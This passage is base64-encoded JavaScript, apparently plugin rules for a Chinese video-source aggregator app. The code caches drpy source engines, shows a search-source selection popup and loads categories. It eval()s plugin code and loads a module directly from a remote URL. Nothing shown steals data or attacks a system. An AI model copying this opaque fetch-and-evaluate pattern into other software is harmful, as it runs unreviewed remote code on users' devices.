9kdWxlKFxcXFxcXFwicnVudGltZUNvbmZpZ1xcXFxcXFwiKTtcXFxcbmNvbnN0IGRycHlNYXAgPSBuZXcgTWFwKCk7XFxcXG5jb25zdCBHTWtleSA9IG1vZHVsZS5pbXBvcnRQYXJhbTtcXFxcbmxvZyhcXFxcXFxcIuWIneWni+WMlkRycHlNYW5hZ2VcXFxcXFxcIik7XFxcXG5cXFxcbmZ1bmN0aW9uIGJ1aWxkSnNFbnYodGlja2V0KSB7XFxcXG4gICAgbGV0IGNvZGUgPSBTdHJpbmcucmF3IGBcXFxcbiAgICAvLyBjb25zdCBteV9ydWxlID0gJ1xcXFxuICAgIGNvbnN0IE1ZX1JVTEUgPSAke215X3J1bGV9O1xcXFxuICAgIGNvbnN0IG15X3J1bGUgPSBKU09OLnN0cmluZ2lmeShNWV9SVUxFKTtcXFxcbiAgICBjb25zdCBNWV9USUNLRVQgPSBcXFxcXFxcIiR7dGlja2V0fHxcXFxcXFxcIlxcXFxcXFwifVxcXFxcXFwiO1xcXFxuICAgIGV2YWwoZ2V0SnNQbHVnaW4oKSk7XFxcXG4gICAgZXZhbChnZXRKc0xhenlQbHVnaW4oKSk7XFxcXG4gICAgYDtcXFxcbiAgICByZXR1cm4gY29kZTtcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gc3luYyhmdW5jLCBzcCkge1xcXFxuICAgIHJldHVybiBuZXcgb3JnLm1vemlsbGEuamF2YXNjcmlwdC5TeW5jaHJvbml6ZXIoZnVuYywgc3AgfHwge30pO1xcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBjcmVhdGVEcnB5KGtleSkge1xcXFxuICAgIEpTRW5naW5lLmdldEluc3RhbmNlKCkuZXZhbEpTKGJ1aWxkSnNFbnYoTVlfVElDS0VUKSArIFxcXFxcXFwiXFxcXFxcXFxuIVxcXFxcXFwiICsgJC50b1N0cmluZygoa2V5LCBHTWtleSwgTVlfVElDS0VUKSA9PiB7XFxcXG4gICAgICAgIGxldCBkcnB5ID0gJC5yZXF1aXJlKFxcXFxcXFwiZHJweVxcXFxcXFwiKTtcXFxcbiAgICAgICAgR00uaGFzKEdNa2V5LCAoRHJweU1hbmFnZSkgPT4ge1xcXFxuICAgICAgICAgICAgRHJweU1hbmFnZS5wdXQoa2V5LCBkcnB5KTtcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgfSwga2V5LCBHTWtleSwgTVlfVElDS0VUKSArIFxcXFxcXFwiO1xcXFxcXFxcblxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiLCBmYWxzZSk7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIGdldChrZXkpIHtcXFxcbiAgcmV0dXJuIHN5bmMoKCkgPT4ge1xcXFxuICAgIC8vbG9nKGRycHlNYXAuc2l6ZSlcXFxcbiAgICBpZiAoZHJweU1hcC5oYXMoa2V5KSkge1xcXFxuICAgICAgcmV0dXJuIGRycHlNYXAuZ2V0KGtleSk7XFxcXG4gICAgfVxcXFxuICAgIGlmIChkcnB5TWFwLnNpemUgPj0gNSkge1xcXFxuICAgICAgbG9nKFxcXFxcXFwi6K+35rGCOlxcXFxcXFwiICsga2V5KVxcXFxuICAgICAgZGVsKEFycmF5LmZyb20oZHJweU1hcC5rZXlzKCkpLmF0KDApKTtcXFxcbiAgICB9XFxcXG4gICAgbGV0IHNvdXJjZSA9IHJ1bnRpbWVDb25maWcuZ2V0QWxsU291cmNlcygpLmZpbmQodiA9PiB2LmtleSA9PT0ga2V5KTtcXFxcbiAgICBjcmVhdGVEcnB5KGtleSk7XFxcXG4gICAgbGV0IGRycHkgPSBkcnB5TWFwLmdldChrZXkpO1xcXFxuICAgIGRycHkuaW5pdChydW50aW1lQ29uZmlnLmdldEFic29sdXRlUGF0aChzb3VyY2UuZXh0KSk7XFxcXG4gICAgcmV0dXJuIGRycHk7XFxcXG4gIH0sIHRoaXMpLmNhbGwoKTtcXFxcbn1cXFxcbi8vc291cmNlLmV4dOW/hemhu+S4uue7neWvuei3r+W+hFxcXFxuZnVuY3Rpb24gZ2V0QnlTb3VyY2Uoc291cmNlKXtcXFxcbiAgICByZXR1cm4gc3luYygoKSA9PiB7XFxcXG4gICAgICAgIGxldCBrZXk9c291cmNlLmtleTtcXFxcbiAgICAgICAgLy9sb2coZHJweU1hcC5zaXplKVxcXFxuICAgICAgICBpZiAoZHJweU1hcC5oYXMoa2V5KSkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIGRycHlNYXAuZ2V0KGtleSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgaWYgKGRycHlNYXAuc2l6ZSA+PSA1KSB7XFxcXG4gICAgICAgICAgICBsb2coXFxcXFxcXCLor7fmsYI6XFxcXFxcXCIgKyBrZXkpXFxcXG4gICAgICAgICAgICBkZWwoQXJyYXkuZnJvbShkcnB5TWFwLmtleXMoKSkuYXQoMCkpO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGNyZWF0ZURycHkoa2V5KTtcXFxcbiAgICAgICAgbGV0IGRycHkgPSBkcnB5TWFwLmdldChrZXkpO1xcXFxuICAgICAgICBkcnB5LmluaXQoc291cmNlLmV4dCk7XFxcXG4gICAgICAgIHJldHVybiBkcnB5O1xcXFxuICAgIH0sIHRoaXMpLmNhbGwoKTtcXFxcbn1cXFxcbmZ1bmN0aW9uIHB1dChrZXksIGRycHkpIHtcXFxcbiAgICBzeW5jKCgpID0+IGRycHlNYXAuc2V0KGtleSwgZHJweSksIHRoaXMpLmNhbGwoKTtcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gZGVsKGtleSkge1xcXFxuICAgIHN5bmMoKCkgPT4ge1xcXFxuICAgICAgICBsb2coXFxcXFxcXCLliKDpmaRcXFxcXFxcIiArIGtleSk7XFxcXG4gICAgICAgIGlmIChkcnB5TWFwLmhhcyhrZXkpKSB7XFxcXG4gICAgICAgICAgICBkcnB5TWFwLmRlbGV0ZShrZXkpO1xcXFxuICAgICAgICB9XFxcXG4gICAgfSwgdGhpcykuY2FsbCgpO1xcXFxufVxcXFxubGV0IGlzSW5pdEhvbWUgPSBmYWxzZTtcXFxcbi8vbGV0IGlzSW5pdFNlYXJjaCA9IGZhbHNlO1xcXFxubGV0IGlzSW5pdEVyUGFnZSA9IGZhbHNlO1xcXFxuXFxcXG5mdW5jdGlvbiBpbml0UGFnZSh0eXBlKSB7XFxcXG4gICAgc3dpdGNoICh0eXBlKSB7XFxcXG4gICAgICAgIGNhc2UgXFxcXFxcXCJob21lXFxcXFxcXCI6XFxcXG4gICAgICAgICAgICBpc0luaXRIb21lID0gdHJ1ZTtcXFxcbiAgICAgICAgICAgIC8vY2FzZSBcXFxcXFxcInNlYXJjaFxcXFxcXFwiOlxcXFxuICAgICAgICAgICAgLy8gICAgaXNJbml0U2VhcmNoID0gdHJ1ZTtcXFxcbiAgICAgICAgY2FzZSBcXFxcXFxcImVyXFxcXFxcXCI6XFxcXG4gICAgICAgICAgICBpc0luaXRlclBhZ2UgPSB0cnVlO1xcXFxuICAgIH1cXFxcbiAgICBhZGRMaXN0ZW5lcihcXFxcXFxcIm9uQ2xvc2VcXFxcXFxcIiwgJC50b1N0cmluZygoR01rZXksIHR5cGUpID0+IHtcXFxcbiAgICAgICAgbG9nKFxcXFxcXFwib25DbG9zZVxcXFxcXFwiKTtcXFxcbiAgICAgICAgR00uaGFzKEdNa2V5LCBEcnB5TWFuYWdlID0+IHtcXFxcbiAgICAgICAgICAgIGxvZyhcXFxcXFxcIuaciUdNa2V5XFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgRHJweU1hbmFnZS5jbGVhcih0eXBlKTtcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgfSwgR01rZXksIHR5cGUpKTtcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gY2xlYXIodHlwZSkge1xcXFxuICAgIHN3aXRjaCAodHlwZSkge1xcXFxuICAgICAgICBjYXNlIFxcXFxcXFwiaG9tZVxcXFxcXFwiOlxcXFxuICAgICAgICAgICAgaXNJbml0SG9tZSA9IGZhbHNlO1xcXFxuICAgICAgICAvL2Nhc2UgXFxcXFxcXCJzZWFyY2hcXFxcXFxcIjpcXFxcbiAgICAgICAgLy8gICAgaXNJbml0U2VhcmNoID0gZmFsc2U7XFxcXG4gICAgICAgIGNhc2UgXFxcXFxcXCJlclxcXFxcXFwiOlxcXFxuICAgICAgICAgICAgaXNJbml0ZXJQYWdlID0gZmFsc2U7XFxcXG4gICAgfVxcXFxuXFxcXG4gICAgaWYgKCFpc0luaXRIb21lICYmICFpc0luaXRFclBhZ2UpIHtcXFxcbiAgICAgICAgbG9nKFxcXFxcXFwi5byA5aeL5riF55CGXFxcXFxcXCIpO1xcXFxuICAgICAgICBkcnB5TWFwLmNsZWFyKCk7XFxcXG4gICAgICAgIEdNLmNsZWFyKEdNa2V5KTtcXFxcbiAgICB9XFxcXG59XFxcXG4kLmV4cG9ydHMgPSB7XFxcXG4gICAgaW5pdFBhZ2UsXFxcXG4gICAgZ2V0LFxcXFxuICAgIGdldEJ5U291cmNlLFxcXFxuICAgIGRlbCxcXFxcbiAgICBjbGVhcixcXFxcbiAgICBwdXRcXFxcbn1cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLmjIflrprmkJzntKLlvLnnqpdcXFwiLFxcXCJwYXRoXFxcIjpcXFwiU2VhcmNoQWxsb3dQb3BcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG4kLmV4cG9ydHMuc2hvdyA9IGZ1bmN0aW9uICgpIHtcXFxcbiAgY29uc3QgcnVudGltZUNvbmZpZyA9IEdNLmRlZmluZU1vZHVsZShcXFxcXFxcInJ1bnRpbWVDb25maWdcXFxcXFxcIiwgXFxcXFxcXCJydW50aW1lQ29uZmlnXFxcXFxcXCIpO1xcXFxuICBjb25zdCBoaWtlclBvcCA9ICQucmVxdWlyZShcXFxcXFxcImh0dHA6Ly9oaWtlci5ub2tpYS5wcmVzcy9oaWtlcnVsZS9ydWxlbGlzdC5qc29uP2lkPTY5NjZcXFxcXFxcIik7XFxcXG4gIGxldCBzZWFyY2hBbGxvdyA9IHJ1bnRpbWVDb25maWcuZ2V0U2VhcmNoQWxsb3coKTtcXFxcblxcXFxuICBsZXQgY2FuU2VhcmNoU291cmNlID0gcnVudGltZUNvbmZpZy5nZXRDYW5TZWFyY2hTb3VyY2UoKTtcXFxcbiAgLy9sZXQgc291cmNlTmFtZUxpc3QgPSBjYW5TZWFyY2hTb3VyY2UubWFwKHY9PnYubmFtZSk7XFxcXG4gIGxldCBnZXROYW1lcyA9ICgpID0+IGR5bmFtaWNTb3VyY2UubWFwKHYgPT4gc2VhcmNoQWxsb3cuaW5jbHVkZXModi5rZXkpID8gXFxcXFxcXCLigJzigJzigJ3igJ1cXFxcXFxcIiArICh2Lm5hbWUgKyBcXFxcXFxcIlxcXFxcXFwiKS5mb250Y29sb3IoXFxcXFxcXCIjMDA5OTY2XFxcXFxcXCIpIDogdi5uYW1lKTtcXFxcbiAgbGV0IHNwZW4gPSAzO1xcXFxuXFxcXG4gIC8vbGV0IGR5bmFtaWNOYW1lcyA9IHNvdXJjZU5hbWVMaXN0LnNsaWNlKCk7XFxcXG4gIGxldCBkeW5hbWljU291cmNlID0gY2FuU2VhcmNoU291cmNlLnNsaWNlKCk7XFxcXG4gIGxldCBzZWFyY2hvbmNvdW50ID0gZHluYW1pY1NvdXJjZS5maWx0ZXIodiA9PiBzZWFyY2hBbGxvdy5pbmNsdWRlcyh2LmtleSkpLmxlbmd0aDtcXFxcbiAgaWYgKHNlYXJjaG9uY291bnQgPT0gMCkge1xcXFxuICAgIHNlYXJjaG9uY291bnQgPSBjYW5TZWFyY2hTb3VyY2UubGVuZ3RoO1xcXFxuICB9XFxcXG5cXFxcbiAgbGV0IHNlYXJjaEtleSA9IFxcXFxcXFwiXFxcXFxcXCI7XFxcXG4gIGhpa2VyUG9wLnNlbGVjdEJvdHRvbVJlcyh7XFxcXG4gICAgb3B0aW9uczogZ2V0TmFtZXMoKSxcXFxcbiAgICBjb2x1bW5zOiBzcGVuLFxcXFxuICAgIHRpdGxlOiBcXFxcXFxcIuWQr+eUqOaQnOe0oua6kDpcXFxcXFxcIiArIHNlYXJjaG9uY291bnQgKyBcXFxcXFxcIuS4qiDlhbE6XFxcXFxcXCIgKyBjYW5TZWFyY2hTb3VyY2UubGVuZ3RoICsgXFxcXFxcXCLkuKrmkJzntKLmupBcXFxcXFxcIixcXFxcbiAgICBub0F1dG9EaXNtaXNzOiB0cnVlLFxcXFxuICAgIHBvc2l0aW9uOiAxLFxcXFxuICAgIGhlaWdodDogLjksXFxcXG4gICAgZXh0cmFJbnB1dEJveDogbmV3IGhpa2VyUG9wLlJlc0V4dHJhSW5wdXRCb3goe1xcXFxuICAgICAgaGludDogXFxcXFxcXCLmupDlhbPplK7lrZcg5aSa5Liq55SofOmalOW8gFxcXFxcXFwiLFxcXFxuICAgICAgdGl0bGU6IFxcXFxcXFwib2tcXFxcXFxcIixcXFxcbiAgICAgIG9uQ2hhbmdlKHRleHQsIG1hbmFnZSkge1xcXFxuICAgICAgICAvL2xvZyhcXFxcXFxcIm9uQ2hhbmdlOlxcXFxcXFwiK3RleHQpXFxcXG4gICAgICAgIHNlYXJjaEtleSA9IHRleHQ7XFxcXG4gICAgICAgIG1hbmFnZS5saXN0Lmxlbmd0aCA9IDA7XFxcXG4gICAgICAgIGR5bmFtaWNTb3VyY2UubGVuZ3RoID0gMDtcXFxcbiAgICAgICAgaWYgKHRleHQpIHtcXFxcbiAgICAgICAgICBjYW5TZWFyY2hTb3VyY2UuZm9yRWFjaCgodiwgaSkgPT4ge1xcXFxuICAgICAgICAgICAgaWYgKHRleHQuc3BsaXQoL1xcXFxcXFxcfC8pLmZpbHRlcihmID0+IGYpLnNvbWUoeCA9PiB2Lm5hbWUuaW5jbHVkZXMoeCkpKSB7XFxcXG4gICAgICAgICAgICAgIGR5bmFtaWNTb3VyY2UucHVzaCh2KTtcXFxcbiAgICAgICAgICAgICAgbWFuYWdlLmxpc3QucHVzaChzZWFyY2hBbGxvdy5pbmNsdWRlcyh2LmtleSkgPyBcXFxcXFxcIuKAnOKAnOKAneKAnVxcXFxcXFwiICsgKHYubmFtZSArIFxcXFxcXFwiXFxcXFxcXCIpLmZvbnRjb2xvcihcXFxcXFxcIiMwMDk5NjZcXFxcXFxcIikgOiB2Lm5hbWUpXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgfSk7XFxcXG4gICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgZHluYW1pY1NvdXJjZSA9IGNhblNlYXJjaFNvdXJjZS5zbGljZSgpO1xcXFxuICAgICAgICAgIE9iamVjdC5hc3NpZ24obWFuYWdlLmxpc3QsIGdldE5hbWVzKCkpO1xcXFxuXFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgbWFuYWdlLmNoYW5nZSgpO1xcXFxuICAgICAgfSxcXFxcbiAgICAgIGRlZmF1bHRWYWx1ZTogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICAgIGNsaWNrKHMsIG1hbmFnZSkge1xcXFxuICAgICAgICAvL3RvYXN0KHMpO1xcXFxuICAgICAgICAvL2xvZyhtYW5hZ2UubGlzdCk7XFxcXG4gICAgICB9LFxcXFxuICAgICAgdGl0bGVWaXNpYmxlOiBmYWxzZVxcXFxuICAgIH0pLFxcXFxuICAgIGNsaWNrKHMsIGksIG1hbmFnZSkge1xcXFxuXFxcXG4gICAgICBsZXQga2V5ID0gZHluYW1pY1NvdXJjZVtpXS5rZXk7XFxcXG4gICAgICBsZXQgaW5kZXggPSAtMTtcXFxcbiAgICAgIGlmICgoaW5kZXggPSBzZWFyY2hBbGxvdy5pbmRleE9mKGtleSkpICE9PSAtMSkge1xcXFxuICAgICAgICBtYW5hZ2UubGlzdFtpXSA9IGR5bmFtaWNTb3VyY2VbaV0ubmFtZTtcXFxcbiAgICAgICAgc2VhcmNoQWxsb3cuc3BsaWNlKGluZGV4LCAxKTtcXFxcbiAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgIG1hbmFnZS5saXN0W2ldID0gXFxcXFxcXCLigJzigJzigJ3igJ1cXFxcXFxcIiArIChkeW5hbWljU291cmNlW2ldLm5hbWUgKyBcXFxcXFxcIlxcXFxcXFwiKS5mb250Y29sb3IoXFxcXFxcXCIjMDA5OTY2XFxcXFxcXCIpO1xcXFxuICAgICAgICBzZWFyY2hBbGxvdy5wdXNoKGtleSk7XFxcXG4gICAgICB9XFxcXG5cXFxcbiAgICAgIHJ1bnRpbWVDb25maWcuc2V0U2VhcmNoQWxsb3coKTtcXFxcbiAgICAgIG1hbmFnZS5jaGFuZ2UoKTtcXFxcbiAgICB9LFxcXFxuICAgIG1lbnVDbGljayhtYW5hZ2UpIHtcXFxcbiAgICAgIGhpa2VyUG9wLnNlbGVjdENlbnRlcih7XFxcXG4gICAgICAgIG9wdGlvbnM6IFtcXFxcXFxcIuaUueWPmOagt+W8j1xcXFxcXFwiLCBcXFxcXFxcIuetm+mAiea6kFxcXFxcXFwiLCBcXFxcXFxcIuiHqueEtuaOkuW6j1xcXFxcXFwiLCBcXFxcXFxcIuWAkuW6j1xcXFxcXFwiLCBcXFxcXFxcIuWFqOmAiVxcXFxcXFwiLCBcXFxcXFxcIuWPjemAiVxcXFxcXFwiXSxcXFxcbiAgICAgICAgY29sdW1uczogMixcXFxcbiAgICAgICAgdGl0bGU6IFxcXFxcXFwi6K+36YCJ5oupXFxcXFxcXCIsXFxcXG4gICAgICAgIGNsaWNrKHMsIGkpIHtcXFxcbiAgICAgICAgICBpZiAoaSA9PT0gMCkge1xcXFxuICAgICAgICAgICAgc3BlbiA9IHNwZW4gPT0gMyA/IDEgOiAzO1xcXFxuICAgICAgICAgICAgbWFuYWdlLmNoYW5nZUNvbHVtbnMoc3Blbik7XFxcXG4gICAgICAgICAgfSBlbHNlIGlmIChpID09PSAxKSB7XFxcXG4gICAgICAgICAgICBoaWtlclBvcC5pbnB1dENvbmZpcm0oe1xcXFxuICAgICAgICAgICAgICBjb250ZW50OiBcXFxcXFxcIui+k+WFpeWFs+mUruWtlyDnqbrmmL7npLrlhajpg6hcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi562b6YCJ5rqQXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgIGhpbnQ6IFxcXFxcXFwi5rqQ5YWz6ZSu5a2XIOWkmuS4queUqHzpmpTlvIBcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgZGVmYXVsdFZhbHVlOiBzZWFyY2hLZXksXFxcXG4gICAgICAgICAgICAgIHRleHRhcmVhOiBmYWxzZSwgLy/lpJrooYzmqKHlvI9cXFxcbiAgICAgICAgICAgICAgbWF4VGV4dGFyZWE6IHRydWUsXFxcXG4gICAgICAgICAgICAgIG5vQXV0b1NvZnQ6IGZhbHNlLFxcXFxuICAgICAgICAgICAgICAvL2hpZGVDYW5jZWw6IHRydWUsXFxcXG4gICAgICAgICAgICAgIGNvbmZpcm0odGV4dCkge1xcXFxuICAgICAgICAgICAgICAgIHNlYXJjaEtleSA9IHRleHQ7XFxcXG4gICAgICAgICAgICAgICAgbWFuYWdlLmxpc3QubGVuZ3RoID0gMDtcXFxcbiAgICAgICAgICAgICAgICBkeW5hbWljU291cmNlLmxlbmd0aCA9IDA7XFxcXG4gICAgICAgICAgICAgICAgaWYgKHRleHQpIHtcXFxcbiAgICAgICAgICAgICAgICAgIGNhblNlYXJjaFNvdXJjZS5mb3JFYWNoKCh2LCBpKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGlmICh0ZXh0LnNwbGl0KC9cXFxcXFxcXHwvKS5maWx0ZXIoZiA9PiBmKS5zb21lKHggPT4gdi5uYW1lLmluY2x1ZGVzKHgpKSkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgIGR5bmFtaWNTb3VyY2UucHVzaCh2KTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICBtYW5hZ2UubGlzdC5wdXNoKHNlYXJjaEFsbG93LmluY2x1ZGVzKHYua2V5KSA/IFxcXFxcXFwi4oCc4oCc4oCd4oCdXFxcXFxcXCIgKyAodi5uYW1lICsgXFxcXFxcXCJcXFxcXFxcIikuZm9udGNvbG9yKFxcXFxcXFwiIzAwOTk2NlxcXFxcXFwiKSA6IHYubmFtZSlcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICAgIGR5bmFtaWNTb3VyY2UgPSBjYW5TZWFyY2hTb3VyY2Uuc2xpY2UoKTtcXFxcbiAgICAgICAgICAgICAgICAgIE9iamVjdC5hc3NpZ24obWFuYWdlLmxpc3QsIGdldE5hbWVzKCkpO1xcXFxuXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIG1hbmFnZS5jaGFuZ2UoKTtcXFxcbiAgICAgICAgICAgICAgICAvL3JldHVybiBcXFxcXFxcInRvYXN0Oi8v6L6T5YWl5LqGXFxcXFxcXCIgKyB0ZXh0O1xcXFxuICAgICAgICAgICAgICB9LFxcXFxuXFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICB9IGVsc2UgaWYgKGkgPT09IDIpIHtcXFxcbiAgICAgICAgICAgIGxldCBsaXN0ID0gT2JqZWN0LmFzc2lnbihbXSwgbWFuYWdlLmxpc3QpO1xcXFxuICAgICAgICAgICAgbWFuYWdlLmxpc3QubGVuZ3RoID0gMDtcXFxcblxcXFxuXFxcXG4gICAgICAgICAgICBkeW5hbWljU291cmNlLnNvcnQoKGEsIGIpID0+IHtcXFxcbiAgICAgICAgICAgICAgcmV0dXJuIFN0cmluZyhhLm5hbWUpLmxvY2FsZUNvbXBhcmUoU3RyaW5nKGIubmFtZSksIHVuZGVmaW5lZCwge1xcXFxuICAgICAgICAgICAgICAgIG51bWVyaWM6IHRydWUsXFxcXG4gICAgICAgICAgICAgICAgc2Vuc2l0aXZpdHk6ICdiYXNlJ1xcXFxuICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgT2JqZWN0LmFzc2lnbihtYW5hZ2UubGlzdCwgZ2V0TmFtZXMoKSk7XFxcXG4gICAgICAgICAgICBtYW5hZ2UuY2hhbmdlKCk7XFxcXG4gICAgICAgICAgfSBlbHNlIGlmIChpID09IDMpIHtcXFxcbiAgICAgICAgICAgIG1hbmFnZS5saXN0LnJldmVyc2UoKTtcXFxcbiAgICAgICAgICAgIGR5bmFtaWNTb3VyY2UucmV2ZXJzZSgpO1xcXFxuXFxcXG4gICAgICAgICAgICBtYW5hZ2UuY2hhbmdlKCk7XFxcXG4gICAgICAgICAgfSBlbHNlIGlmIChpID09IDQpIHtcXFxcbiAgICAgICAgICAgIGR5bmFtaWNTb3VyY2UuZm9yRWFjaCh2ID0+IHtcXFxcbiAgICAgICAgICAgICAgaWYgKCFzZWFyY2hBbGxvdy5pbmNsdWRlcyh2KSkge1xcXFxuICAgICAgICAgICAgICAgIHNlYXJjaEFsbG93LnB1c2godi5rZXkpO1xcXFxuICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgIE9iamVjdC5hc3NpZ24obWFuYWdlLmxpc3QsIGdldE5hbWVzKCkpO1xcXFxuICAgICAgICAgICAgcnVudGltZUNvbmZpZy5zZXRTZWFyY2hBbGxvdygpO1xcXFxuICAgICAgICAgICAgbWFuYWdlLmNoYW5nZSgpO1xcXFxuICAgICAgICAgIH0gZWxzZSBpZiAoaSA9PSA1KSB7XFxcXG4gICAgICAgICAgICBsZXQgdGVtbGlzdCA9IHNlYXJjaEFsbG93LnNsaWNlKCk7XFxcXG4gICAgICAgICAgICBzZWFyY2hBbGxvdy5sZW5ndGggPSAwO1xcXFxuICAgICAgICAgICAgZHluYW1pY1NvdXJjZS5mb3JFYWNoKHYgPT4ge1xcXFxuICAgICAgICAgICAgICBpZiAodGVtbGlzdC5pbmNsdWRlcyh2LmtleSkpIHJldHVybjtcXFxcbiAgICAgICAgICAgICAgc2VhcmNoQWxsb3cucHVzaCh2LmtleSk7XFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgIE9iamVjdC5hc3NpZ24obWFuYWdlLmxpc3QsIGdldE5hbWVzKCkpO1xcXFxuICAgICAgICAgICAgcnVudGltZUNvbmZpZy5zZXRTZWFyY2hBbGxvdygpO1xcXFxuICAgICAgICAgICAgbWFuYWdlLmNoYW5nZSgpO1xcXFxuICAgICAgICAgIH1cXFxcbiAgICAgICAgfSxcXFxcbiAgICAgIH0pO1xcXFxuICAgIH1cXFxcbiAgfSk7XFxcXG59XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5YiG57G7XFxcIixcXFwicGF0aFxcXCI6XFxcImNhdGVnb3J5c1xcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbmxldCBmbCA9IHt9O1xcXFxubGV0IHJlc3VsdHMgPSBbXTtcXFxcbmxldCBob21lbGlzdCA9IFtdO1xcXFxubGV0IGNhdGUgPSBcXFxcXFxcIlxcXFxcXFwiO1xcXFxuXFxcXG5mdW5jdGlvbiBnZXRDYXRlZ29yeXMobGF5b3V0LGRycHksIHBhZ2UpIHtcXFxcbiAgbGV0IHJ1bGU9ZHJweS5ydW5NYWluKCdmdW5jdGlvbiBtYWluKCl7cmV0dXJuIHJ1bGV9Jyk7XFxcXG4gIGlmKHJ1bGUu5LiA57qnPT1cXFxcXFxcIlxcXFxcXFwifHxydWxlLuS4gOe6pz09dW5kZWZpbmVkKXtcXFxcbiAgICBjbGVhck15VmFyKFxcXFxcXFwibGlua3NcXFxcXFxcIik7XFxcXG4gICAgbGF5b3V0Lmxlbmd0aD0wO1xcXFxuICAgIHRocm93IG5ldyBFcnJvcihcXFxcXFxcIuivpea6kOS4uuaQnOe0oua6kO+8jOS7heiDvemAmui/h+aQnOe0ouiuv+mXruaVsOaNrlxcXFxcXFwiKVxcXFxuICB9XFxcXG4gIHZhciBnZXRSYW5nZUNvbG9ycyA9IGZ1bmN0aW9uICgpIHtcXFxcbiAgICByZXR1cm4gJyMnICsgKCcwMDAwMCcgKyAoTWF0aC5yYW5kb20oKSAqIDB4MTAwMDAwMCA8PCAwKS50b1N0cmluZygxNikpLnN1YnN0cigtNik7XFxcXG4gIH1cXFxcbiAgbGV0IGNhdGVnb3J5cyA9IEpTT04ucGFyc2UoZHJweS5ob21lKCkpO1xcXFxuICBsZXQgZmlsdGVycyA9IGNhdGVnb3J5cy5maWx0ZXJzO1xcXFxuICBsZXQgY2F0ZXMgPSBjYXRlZ29yeXMuY2xhc3MgfHwgW107XFxcXG4gIGlmIChwYWdlID09IDEpIHtcXFxcbiAgICBob21lbGlzdCA9IEpTT04ucGFyc2UoZHJweS5ob21lVm9kKCkpLmxpc3Q7XFxcXG4gICAgaWYgKGhvbWVsaXN0ICE9IHVuZGVmaW5lZCAmJiBob21lbGlzdC5sZW5ndGgpIHtcXFxcbiAgICAgIHB1dE15VmFyKFxcXFxcXFwiaXNob21lXFxcXFxcXCIsIFxcXFxcXFwiMVxcXFxcXFwiKTtcXFxcbiAgICB9XFxcXG4gIH1cXFxcbiAgaWYgKGNhdGVzLmxlbmd0aCA9PSAwICYmIChob21lbGlzdCA9PSB1bmRlZmluZWQgfHwgaG9tZWxpc3QubGVuZ3RoID09IDApKSB7XFxcXG4gICAgY2xlYXJNeVZhcihcXFxcXFxcImxpbmtzXFxcXFxcXCIpO1xcXFxuICAgIGxheW91dC5sZW5ndGg9MDtcXFxcbiAgICB0aHJvdyBuZXcgRXJyb3IoXFxcXFxcXCLliIbnsbvojrflj5blpLHotKXlj6/og73nvZHnu5zpl67pophcXFxcXFxcIik7XFxcXG4gIH1cXFxcbiAgaWYgKGdldE15VmFyKFxcXFxcXFwiaXNob21lXFxcXFxcXCIsIFxcXFxcXFwiMFxcXFxcXFwiKSA9PSBcXFxcXFxcIjFcXFxcXFxcIikge1xcXFxuICAgIGNhdGVzLnVuc2hpZnQoe1xcXFxuICAgICAgdHlwZV9uYW1lOiAn5o6o6I2QJyxcXFxcbiAgICAgIHR5cGVfaWQ6ICdob21lJyxcXFxcbiAgICB9KVxcXFxuICB9XFxcXG4gIGxldCBsb2FkaT1sYXlvdXQuZmluZEluZGV4KHg9PnguZXh0cmEmJnguZXh0cmEuaWQ9PU1ZX1JVTEUudGl0bGUrXFxcXFxcXCJsb2FkXFxcXFxcXCIpO1xcXFxuICBpZihsb2FkaSE9LTEpe1xcXFxuICAgICAgbGF5b3V0LnNwbGljZShsb2FkaSwxKVxcXFxuICB9XFxcXG4gIHB1dE15VmFyKFxcXFxcXFwibGlua3NcXFxcXFxcIixcXFxcXFxcIjFcXFxcXFxcIik7XFxcXG4gIGxldCBjYXRlaSA9IGdldE15VmFyKFxcXFxcXFwiY2F0ZWlcXFxcXFxcIiwgXFxcXFxcXCIwXFxcXFxcXCIpO1xcXFxuICBjYXRlID0gY2F0ZXNbY2F0ZWldLnR5cGVfaWQ7XFxcXG5cXFxcbiAgdmFyIGZvbGQgPSBzdG9yYWdlMC5nZXRJdGVtKFxcXFxcXFwiZm9sZFxcXFxcXFwiLCBcXFxcXFxcIjBcXFxcXFxcIik7XFxcXG4gIGxl